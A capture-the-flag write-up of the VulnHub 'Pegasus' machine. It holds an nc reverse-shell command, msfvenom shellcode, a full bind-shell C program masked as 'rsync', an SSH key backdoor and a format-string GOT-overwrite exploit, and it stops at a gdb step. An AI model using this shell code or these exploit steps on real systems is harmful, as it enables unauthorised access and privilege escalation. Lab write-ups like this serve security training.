&lt;p&gt;Having recently played in the &lt;a href=&#34;https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/&#34;&gt;Offsec Playground&lt;/a&gt; a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&amp;hellip; &lt;em&gt;again&lt;/em&gt;. You will see this in the &lt;strong&gt;my_first&lt;/strong&gt; section.&lt;/p&gt;

&lt;p&gt;Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!&lt;/p&gt;

&lt;p&gt;Lets begin.&lt;/p&gt;

&lt;h2 id=&#34;nmap-again&#34;&gt;nmap, again&lt;/h2&gt;

&lt;p&gt;Starting a VM like this, you should almost have a knee-jerk reaction to reach for nmap as your first tool to use. A VM, hosted on the network, means you will probably be attacking this one&amp;hellip; via the network. So after figuring out what the IP address is (via arp, netdiscover etc.), I threw nmap at it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap --reason -sV 192.168.56.101 -p-

Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-23 09:16 SAST
Nmap scan report for 192.168.56.101
Host is up, received arp-response (0.00022s latency).
Not shown: 65531 closed ports
Reason: 65531 resets
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
8088/tcp  open  http    syn-ack nginx 1.1.19
55625/tcp open  status  syn-ack 1 (RPC #100024)
MAC Address: 08:00:27:88:F8:40 (Cadmus Computer Systems)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;tcp/22&lt;/code&gt;, &lt;code&gt;tcp/111&lt;/code&gt;, &lt;code&gt;tcp/8088&lt;/code&gt; and &lt;code&gt;tcp/55625&lt;/code&gt;. Thats quite a bit to work with already. I decided to dive right into the web server that appears to be running on &lt;code&gt;tcp/8088&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;stomping-some-hoofs-with-pegasus&#34;&gt;stomping some hoofs with pegasus&lt;/h2&gt;

&lt;p&gt;Browsing to &lt;a href=&#34;http://192.168.56.101:8088/&#34;&gt;http://192.168.56.101:8088/&lt;/a&gt;, we are presented with a picture of Pegasus:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_web.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I manually tried to browse to things like &lt;code&gt;robots.txt&lt;/code&gt; etc, but everything responded with the same image. This was until I decided to browse to &lt;code&gt;index.php&lt;/code&gt;, in an attempt to check that the web server is configured to serve PHP content:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_nginx_index.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;So this doesn’t exactly tell us PHP is supported yet, but it does get us somewhere if we wanted to brute force the web server in search of content. Inspecting the headers of the HTTP responses thus far, we would see that everything would return HTTP 200, however, &lt;code&gt;.php&lt;/code&gt; scripts would 404 correctly. With that in mind, it was time to reach for &lt;code&gt;wfuzz&lt;/code&gt; to discover some more.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc 404 http://192.168.56.101:8088/FUZZ.php

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.56.101:8088/FUZZ.php
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt

Total requests: 1660
==================================================================
ID  Response   Lines      Word         Chars          Request
==================================================================

01426:  C=200      0 L         4 W       19 Ch    &amp;quot; - submit&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And we have a HTTP 200 response for &lt;code&gt;submit.php&lt;/code&gt;. So, I browsed to &lt;a href=&#34;http://192.168.56.101:8088/submit.php:&#34;&gt;http://192.168.56.101:8088/submit.php:&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_submit.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Well that isn&amp;rsquo;t exactly useful. I played a little with the &lt;code&gt;submit.php&lt;/code&gt; by sending a POST with some &lt;code&gt;--data&lt;/code&gt;, but nothing useful came of it. Almost everything came back with &lt;code&gt;No data to process&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Admittedly, this was my first hurdle. I was thinking if there is a &lt;code&gt;submit.php&lt;/code&gt;, surely there is something that actually submits the appropriate data to it? So I pulled out some more wordlists and fed them to wfuzz to work on. I&amp;rsquo;ll be honest, I did not like this part much. The wordlists were just too big and it almost felt like this is probably not the way to go about this. &lt;code&gt;wfuzz&lt;/code&gt; was working with &lt;code&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;, when finally I get a HTTP 200 for &lt;code&gt;codereview.php&lt;/code&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_code_review.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;pwning-mike&#34;&gt;pwning mike&lt;/h2&gt;

&lt;p&gt;So mike is apparently a trainee code reviewer. We have a form where we can submit code for him to check out. This is the form that submits the POST data &lt;code&gt;code&lt;/code&gt; to the previously found &lt;code&gt;submit.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ok. Well this is a interesting one. My initial thoughts were that if Mike was checking out code, he is possibly executing it? There was however no hint on what language he is expecting, so the wild goose chase began.&lt;/p&gt;

&lt;p&gt;PHP, Python, Perl, Ruby, Bash. Name them. I tried them all. Ok maybe not all, especially not brainfk. :D However, in all of them, I tried to get the language to execute &lt;code&gt;/bin/nc 192.168.56.102 4444 -e /bin/sh&lt;/code&gt; or variants thereof so that it would connect to my netcat listener on my Kali machine, and spawn me a shell.&lt;/p&gt;

&lt;p&gt;Eventually, I came to try some C. Admittedly, I was starting to rethink my strategy by now. That was until my C source had a call to &lt;code&gt;system()&lt;/code&gt; in it:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_code_review_security.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Ooooooh. Ok so that was a very obvious hint that I was getting closer. For me, this boiled down to it either accepting PHP due to &lt;a href=&#34;http://php.net/manual/en/function.system.php&#34;&gt;system&lt;/a&gt;, or C due to its &lt;a href=&#34;http://linux.die.net/man/3/system&#34;&gt;system&lt;/a&gt;. Obviously though, &lt;code&gt;system()&lt;/code&gt; is being filtered out, so I would need an alternative.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;insert fade to black&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;CAPTION: many hours later&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;After exhausting my PHP attempts, it was time to move to C. My first attempt was was something along the lines of&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include&amp;lt;stdio.h&amp;gt;

// msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c
unsigned char buf[] =
&amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&amp;quot;
&amp;quot;\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a&amp;quot;
&amp;quot;\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0&amp;quot;
&amp;quot;\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f&amp;quot;
&amp;quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0&amp;quot;
&amp;quot;\x0b\xcd\x80&amp;quot;;

int main()
{
    int (*ret)() = (int(*)())buf;
    ret();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This was supposed to open me a &lt;code&gt;tcp/4444&lt;/code&gt; shell, but to no avail. Infact, no shellcode related execution appeared to do anything. As a last resort before I figured I&amp;rsquo;d need to get me some hints, I searched for some non-shellcode type bind shell generation C source. Unfortunately, I don’t write C socket software out of my head, but luckily Google came to the rescue and landed me on &lt;a href=&#34;http://bigpointyteeth.se/code/bindshell.c&#34;&gt;this&lt;/a&gt;. I modified the code slightly by hardcoding my desired port and shell, and submitted it to be &amp;lsquo;reviewed&amp;rsquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// Source: http://webcache.googleusercontent.com/search?q=cache:52EC4LfMJX4J:bigpointyteeth.se/code/bindshell.c+&amp;amp;cd=11&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;gl=za
// http://bigpointyteeth.se/code/bindshell.c
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;arpa/inet.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

#define SHELL &amp;quot;/bin/sh&amp;quot;   // shell to execute
#define NAME &amp;quot;rsync&amp;quot;        // name of the forked bindshell shown in ps

int main(int argc, char *argv[]) {
    char msg[16];
    int srv_sockfd, new_sockfd;
    socklen_t new_addrlen;
    struct sockaddr_in srv_addr, new_addr;

    // fork into background
    if (fork() == 0) {
        if ((srv_sockfd = socket(PF_INET, SOCK_STREAM, 0)) &amp;lt; 0) {
            return -1;
        }

        srv_addr.sin_family = PF_INET;
        srv_addr.sin_port = htons(atoi(&amp;quot;4444&amp;quot;));
        srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);

        if (bind(srv_sockfd, (struct sockaddr *)&amp;amp;srv_addr, sizeof(srv_addr)) &amp;lt; 0) {
            return -1;
        }

        if (listen(srv_sockfd, 1) &amp;lt; 0) {
            return -1;
        }

        // accept loop
        for (;;) {
            new_addrlen = sizeof(new_addr);
            new_sockfd = accept(srv_sockfd, (struct sockaddr *)&amp;amp;new_addr, &amp;amp;new_addrlen);
            if (new_sockfd &amp;lt; 0) {
                return -1;
            }

            // fork to handle new connection
            if (fork() == 0) {
                // close old listener
                close(srv_sockfd);
                // print the parent pid which should be killed in order
                // to remove the persistant bindshell listener
                sprintf(msg, &amp;quot;ppid=%d\n&amp;quot;, getppid());
                write(new_sockfd, msg, strlen(msg));

                dup2(new_sockfd, 2);
                dup2(new_sockfd, 1);
                dup2(new_sockfd, 0);

                execl(SHELL, NAME, NULL);
                return 0;
            }
            else
                close(new_sockfd);
        } // end accept loop
    } // end fork into background
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All of my attempts were followed by a nmap on &lt;code&gt;tcp/4444&lt;/code&gt; to see if the shell has become available. After submitting the above code, we got a new port open (this Mike guy is pretty fast you should hire him!):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap 192.168.56.101 -p 4444

Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-23 11:33 SAST
Nmap scan report for 192.168.56.101
Host is up (0.00034s latency).
PORT     STATE SERVICE
4444/tcp open  krb524
MAC Address: 08:00:27:88:F8:40 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome, so lets connect and see what we have:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nc -v 192.168.56.101 4444
192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
(UNKNOWN) [192.168.56.101] 4444 (?) open
ppid=10450
id
uid=1001(mike) gid=1001(mike) groups=1001(mike)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As was hoped for, a shell as &lt;code&gt;mike&lt;/code&gt;. I quickly generated a new ssh key pair for Pegasus, and cat the public key to &lt;code&gt;mike&lt;/code&gt;&amp;rsquo;s &lt;code&gt;authorized_keys&lt;/code&gt; file and went on to SSH in as mike:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# first I cat the public key so that I can copy it
root@kali:~# cat pegasus.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R root@kali

# next I connect to the bind shell listener and move to Mikes .shh directory
root@kali:~# nc -v 192.168.56.101 4444
192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
(UNKNOWN) [192.168.56.101] 4444 (?) open
ppid=10450
cd .ssh

# next we append my public key to mikes authorized_keys
echo &amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R&amp;quot; &amp;gt;&amp;gt; authorized_keys
ls -lh
total 12K
-rw-rw-r-- 1 mike mike  381 Dec 23 20:36 authorized_keys
-rw------- 1 mike mike 1.7K Nov 18 12:39 id_rsa
-rw-r--r-- 1 mike mike  222 Nov 18 17:39 known_hosts
chmod 600 authorized_keys
^C

# with the authorized_keys ready, I SSH in as mike using my key pair
root@kali:~# ssh mike@192.168.56.101 -i pegasus
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-39-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Dec 23 20:36:47 AEDT 2014

  System load:  0.0               Processes:           93
  Usage of /:   6.8% of 18.32GB   Users logged in:     0
  Memory usage: 12%               IP address for eth0: 192.168.56.101
  Swap usage:   0%

  =&amp;gt; There are 2 zombie processes.

  Graph this data and manage this system at:
    https://landscape.canonical.com/


Your Hardware Enablement Stack (HWE) is supported until April 2017.

You have mail.
Last login: Tue Dec 16 19:27:53 2014 from 172.16.246.129
mike@pegasus:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;my-first-your-first-we-all-first&#34;&gt;my_first, your_first, we_all_first&lt;/h2&gt;

&lt;p&gt;With my initial shell I was able to start enumerating Pegasus a little more. The most obvious next step was the SUID binary in &lt;code&gt;mike&lt;/code&gt;&amp;rsquo;s home (we will get to it shortly):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ ls -lh
total 16K
-rwxr-xr-x 1 mike mike  845 Nov 18 20:52 check_code.sh
drwx------ 2 mike mike 4.0K Nov 18 17:49 Mail
-rwsr-xr-x 1 john john 6.5K Nov 28 10:26 my_first
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;More enumeration revealed that &lt;code&gt;/opt/&lt;/code&gt; had a number of interesting parts to it as well:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ ls -lh /opt/
total 12K
drwxrwxrwx 2 root root 4.0K Dec 23 20:33 code_review
drwxr-xr-x 3 root root 4.0K Nov 25 04:38 git
drwxr-xr-x 2 root root 4.0K Nov 18 14:43 nfs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Piecing the web interface together, you will see that the submitted source is put into &lt;code&gt;code.c&lt;/code&gt; in &lt;code&gt;/opt/code_review/&lt;/code&gt;, and then compiled from the script in &lt;code&gt;/home/mike/check_code.sh&lt;/code&gt; and eventually executed.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;/opt/git/&lt;/code&gt; folder had what looked like remnants of the typical &lt;code&gt;.git/&lt;/code&gt; folders when you checkout code from a repo, but not the actual files itself. I poked around a bit, and was able to re-assemble the &lt;code&gt;main.c&lt;/code&gt; file from the git history.&lt;/p&gt;

&lt;h3 id=&#34;rebuilding-main-c&#34;&gt;rebuilding main.c&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;This step is not essential in progressing with Pegasus, but I figured it would be an interesting approach nonetheless&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Even though the git folder did not appear to have any actual source files, one could quickly learn what it contains. For example, the git log will show you the commit history:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:/opt/git/my_first.git$ git log
commit 85365946a8142c52ee6040a029dd069b514c2ab0
Author: Mike Ross &amp;lt;mike@pegasus.(none)&amp;gt;
Date:   Tue Nov 25 04:48:01 2014 +1100

    Committing some security fixes

commit 0a8af1ed956518ec078b152ad7571105e2df26c6
Author: John Wall &amp;lt;john@pegasus.(none)&amp;gt;
Date:   Tue Nov 25 04:39:42 2014 +1100

    initial commit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From the log we can see that there as an initial commit, and one more after that with some &lt;em&gt;security fixes&lt;/em&gt;. Chances are, if we can see what the initial commit was then we can see the full initial code. So, lets check out the details of commit &lt;em&gt;0a8af1ed&lt;/em&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-diff&#34;&gt;mike@pegasus:/opt/git/my_first.git$ git show 0a8af1ed
commit 0a8af1ed956518ec078b152ad7571105e2df26c6
Author: John Wall &amp;lt;john@pegasus.(none)&amp;gt;
Date:   Tue Nov 25 04:39:42 2014 +1100

    initial commit

diff --git a/main.c b/main.c
new file mode 100644
index 0000000..39c0182
--- /dev/null
+++ b/main.c
@@ -0,0 +1,133 @@
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+
+int calculator();
+int string_replay();
+int string_reverse();
+int quit();
+
+int main()
+{
+    char selection[5];
+    int sel;
+    char * err_check;

[... snip ...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nice! We have a file &lt;code&gt;main.c&lt;/code&gt; that was added. I copied the diff and saved it to &lt;code&gt;init.patch&lt;/code&gt;, and then ran the patch:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# patch -p1 &amp;lt; init.diff
patching file main.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That gives us the state of files after commit &lt;em&gt;0a8af1ed&lt;/em&gt; which was labeled as the initial commit. The same process was followed for the next commit &lt;em&gt;85365946a8&lt;/em&gt; which apparently included some &lt;em&gt;security fixes&lt;/em&gt;. Copy the diff, make the .patch file and apply it. After this process, we have the sources up to where the git commit history has it.&lt;/p&gt;

&lt;p&gt;I inspected that code before and after the security fixes commit, and noticed that the security fixes fixed a potential format string vulnerability. At least, that was the one my untrained eye was able to spot:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-diff&#34;&gt;diff --git a/main.c b/main.c
index 39c0182..b6b2ed4 100644
--- a/main.c
+++ b/main.c
@@ -8,7 +8,7 @@ int quit();

[... snip ...]
+
         printf(&amp;quot;Enter second number: &amp;quot;);
         if (fgets(numberB, sizeof numberB, stdin) != NULL)
         {
-            int numA = strtol(numberA, &amp;amp;err_check, 10);
             int numB = strtol(numberB, &amp;amp;err_check, 10);
             if (*err_check != &#39;\n&#39;)
             {
-                printf(&amp;quot;Error details: &amp;quot;);
-                printf(err_check);
+                printf(&amp;quot;Error details: %s&amp;quot;, err_check);
                 printf(&amp;quot;\n&amp;quot;);
                 return 1;
[... snip ...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;printf(err_check);&lt;/code&gt; is the potentially vulnerable call&amp;hellip; I think.&lt;/p&gt;

&lt;h3 id=&#34;the-calculator-with-a-hole&#34;&gt;the calculator with a hole&lt;/h3&gt;

&lt;p&gt;After toying with the git repository, my attention turned back to the SUID binary. When I run &lt;code&gt;my_first&lt;/code&gt;, I am actually running it as &lt;code&gt;john&lt;/code&gt;. This means, should I be able to exploit it and do things other than what its intended for, I may affectively gain &lt;code&gt;john&lt;/code&gt;&amp;rsquo;s privileges! Sounds easy right. :P&lt;/p&gt;

&lt;p&gt;I quickly realized that the &lt;code&gt;main.c&lt;/code&gt; file I got out of the git repository, was the sources for the &lt;code&gt;my_first&lt;/code&gt; binary. So, my focus shifted to the piece of code I saw the security fix for.&lt;/p&gt;

&lt;p&gt;First, it was time to confirm my suspicion of a format string vulnerability:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 1

Enter first number: 1
Enter second number: %x
Error details: bf96cbec

Selection:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I don’t like format string vulnerabilities. In fact not at all. I was hoping for something else and at this stage, I was happy I found the bug (which was the code before the security fixes btw), but sad that its a format string.&lt;/p&gt;

&lt;p&gt;Anyways, feels aside, it was time to work on a exploit.&lt;/p&gt;

&lt;p&gt;For the format string exploit, I don&amp;rsquo;t think its really worth explaining all the details again. In fact, compiling this exploit, I was referring to a older blogpost about &lt;a href=&#34;https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/&#34;&gt;Xerxes2&lt;/a&gt; which also had a similar thing going. Feel free to check the binary section out there if the next part does not make much sense.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;EDIT&lt;/strong&gt; I have since made a small asciinema showing the offset calculations on my Kali VM. Though the offsets are not the same the theory still applies. &lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/14960.js&#34; id=&#34;asciicast-14960&#34; async data-theme=&#34;solarized-dark&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;h3 id=&#34;punching-more-than-numbers&#34;&gt;punching more than numbers&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;So here, I had a pretty big freaking fail. A massive one. Once I had determined the stack position to start corrupting memory with, I was punching in the format strings in the application itself. Meaning, I was giving it the ASCII \x\x\x\x and not the actual bytes as would have been the case if I was using python/printf to redirect the stdout of them to &lt;code&gt;my_first&lt;/code&gt;&amp;rsquo;s stdin. Anyways, lessons were learnt, caffeine was injected. It wont happen again. Big up to &lt;a href=&#34;https://twitter.com/barrebas&#34;&gt;@barrebas&lt;/a&gt; for subtly pointing the fail out ;p&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;As I had seen the source code, it was easy to formulate a plan for the exploit. I would make use of a ret2libc attack by overriding the GOT entry for &lt;code&gt;printf()&lt;/code&gt; using the format string to &lt;code&gt;system()&lt;/code&gt; instead. This means, the next time &lt;code&gt;printf()&lt;/code&gt; is called, it would actually execute &lt;code&gt;system()&lt;/code&gt; with the adjacent argument on the stack. Lets see how this was done.&lt;/p&gt;

&lt;h4 id=&#34;compiling-the-format-string&#34;&gt;compiling the format string&lt;/h4&gt;

&lt;p&gt;We know that the 2nd number that the applications wants triggers our format string. So, lets prepare some skeleton input, piping it to the &lt;code&gt;./my_first&lt;/code&gt; binary to sample a successful run:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ printf &#39;1\n1\n1\n4\n&#39; | ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
Enter first number: Enter second number: Result: 1 + 1 = 2

Selection:
Goodbye!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Cool, so we have sampled adding 1 to 1 ;p Now we can get to exploiting the format string. The first step we have is to determine which parameter on the stack we have control of. We determine this by providing it with a string of 4 A&amp;rsquo;s, and then incrementing the format string arguments by 1 until we can find the 4 A&amp;rsquo;s. In my case, I will be formatting them as hex with &lt;code&gt;%x&lt;/code&gt;, so I am searching for &lt;code&gt;41414141&lt;/code&gt;. The format string will therefore start as &lt;code&gt;AAAA.0x%s&lt;/code&gt;. Note that in the below example we are using 2 x percentages (2 x &amp;lsquo;%&amp;rsquo;) as it needs to be escaped in the shell:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ printf &#39;1\n1\nAAAA.0x%%x\n4\n&#39; | ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
Enter first number: Enter second number: Error details: AAAA.0xbff5321c

Selection:
Goodbye!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And we have the output of &lt;code&gt;AAAA.0xbff5321c&lt;/code&gt;. Yay :)
Continuously incrementing this will eventually get you to argument 8, where you will find the clean string of hex A&amp;rsquo;s:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ printf &#39;1\n1\nAAAA.0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x\n4\n&#39; | ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
Enter first number: Enter second number: Error details: AAAA.0xbfbd145c0xa0xb75b41600xb7726ac00xb7752ff40xb77539180xbfbd14600x41414141

Selection:
Goodbye!
mike@pegasus:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, using direct parameter access in the format string, we can reference parameter 8 directly:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ printf &#39;1\n1\nAAAA.0x%%8$x\n4\n&#39; | ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
Enter first number: Enter second number: Error details: AAAA.0x41414141

Selection:
Goodbye!
mike@pegasus:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Parameter 8 in the format string is the start of the section on the stack we can read now, shown in the output &lt;code&gt;AAAA.0x41414141&lt;/code&gt; of the format string &lt;code&gt;AAAA.0x%8$x&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now we will move on to making use of the &lt;code&gt;%n&lt;/code&gt; format string to write to a arbitrary area in memory. Where do we want to write? To the GOT where the lookup for &lt;code&gt;printf()&lt;/code&gt; occurs ofc! Lets dump the GOT for &lt;code&gt;./my_first&lt;/code&gt;, and determine where it will go look for &lt;code&gt;printf()&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ objdump -R ./my_first

./my_first:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049bec R_386_GLOB_DAT    __gmon_start__
08049c20 R_386_COPY        stdin
08049bfc R_386_JUMP_SLOT   printf
08049c00 R_386_JUMP_SLOT   fgets
08049c04 R_386_JUMP_SLOT   puts
08049c08 R_386_JUMP_SLOT   __gmon_start__
08049c0c R_386_JUMP_SLOT   __libc_start_main
08049c10 R_386_JUMP_SLOT   putchar
08049c14 R_386_JUMP_SLOT   strtol
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The location of &lt;code&gt;printf()&lt;/code&gt; will be looked up at &lt;code&gt;08049bfc&lt;/code&gt;. This is the part where we want to rewrite the address of &lt;code&gt;printf()&lt;/code&gt; to that of libc&amp;rsquo;s &lt;code&gt;system()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The last part we need is to know where &lt;code&gt;system()&lt;/code&gt; actually is. An important vector that may influence this position in memory is known as ASLR, which will effectively cause the address of &lt;code&gt;system()&lt;/code&gt; to be different every time &lt;code&gt;./my_first&lt;/code&gt; is run. To combat this, a neat little trick to increase the stack size can be used using &lt;code&gt;ulimit&lt;/code&gt;. &lt;code&gt;ulimit -s unlimited&lt;/code&gt; will maximize the stack size, effectively causing the ASLR to be practically nonexistent:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ ulimit -s
8192
mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ ulimit -s
unlimited
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the ASLR problem out of the way, lets leak the address of &lt;code&gt;system()&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# fire up gdb
mike@pegasus:~$ gdb -q ./my_first
